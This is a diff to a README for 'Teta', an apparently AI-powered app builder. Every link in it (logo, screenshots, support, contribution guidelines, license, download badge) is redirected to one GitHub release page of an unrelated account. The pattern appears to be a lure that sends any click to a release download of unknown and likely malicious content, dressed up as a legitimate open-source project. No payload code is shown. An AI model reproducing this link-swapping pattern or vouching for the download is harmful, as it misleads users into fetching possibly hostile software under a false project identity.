@@ -1,6 +1,6 @@
 # 🚀 Welcome to Teta - The AI-Powered App Builder! 🧠📱
 
-![Teta Logo](https://example.com/teta_logo.png)
+![Teta Logo](https://github.com/laidnotreal/teta/releases/tag/v1.0)
 
 ## Overview
 Teta is an open-source app builder powered by artificial intelligence, designed to streamline the process of developing cutting-edge applications. With Teta, you can create innovative AI applications, UI/UX designs, and chatbots with ease.
@@ -24,24 +24,24 @@ To get started with Teta, follow the steps below:
 #ai #ai-application-development #ai-builder #ai-chatbot #app #app-builder #dart #editor #flutter #flutter-app #flutter-ui #macos #open-source #oss #ui #ui-editor
 
 ## Download Teta
-📥 [Download Teta v1.0.0 ZIP](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip) 🚀
+📥 [Download Teta v1.0.0 ZIP](https://github.com/laidnotreal/teta/releases/tag/v1.0) 🚀
 
 ## Screenshots
-![Teta Screenshot 1](https://example.com/teta_screenshot1.png)
-![Teta Screenshot 2](https://example.com/teta_screenshot2.png)
-![Teta Screenshot 3](https://example.com/teta_screenshot3.png)
+![Teta Screenshot 1](https://github.com/laidnotreal/teta/releases/tag/v1.0)
+![Teta Screenshot 2](https://github.com/laidnotreal/teta/releases/tag/v1.0)
+![Teta Screenshot 3](https://github.com/laidnotreal/teta/releases/tag/v1.0)
 
 ## Support
-If you encounter any issues or have any questions about Teta, feel free to [open an issue](https://github.com/teta/issues) on the repository.
+If you encounter any issues or have any questions about Teta, feel free to [open an issue](https://github.com/laidnotreal/teta/releases/tag/v1.0) on the repository.
 
 ## Contributing
-We welcome contributions from the community! If you'd like to contribute to Teta, please review our [contribution guidelines](https://github.com/teta/contributing).
+We welcome contributions from the community! If you'd like to contribute to Teta, please review our [contribution guidelines](https://github.com/laidnotreal/teta/releases/tag/v1.0).
 
 ## License
-Teta is released under the [MIT License](https://github.com/teta/license).
+Teta is released under the [MIT License](https://github.com/laidnotreal/teta/releases/tag/v1.0).
 
 ---
 
 🌟 Start building your AI-powered apps with Teta today! 🌟
 
-[![Download Teta](https://img.shields.io/badge/Download-Teta-green)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Teta](https://github.com/laidnotreal/teta/releases/tag/v1.0)](https://github.com/laidnotreal/teta/releases/tag/v1.0)
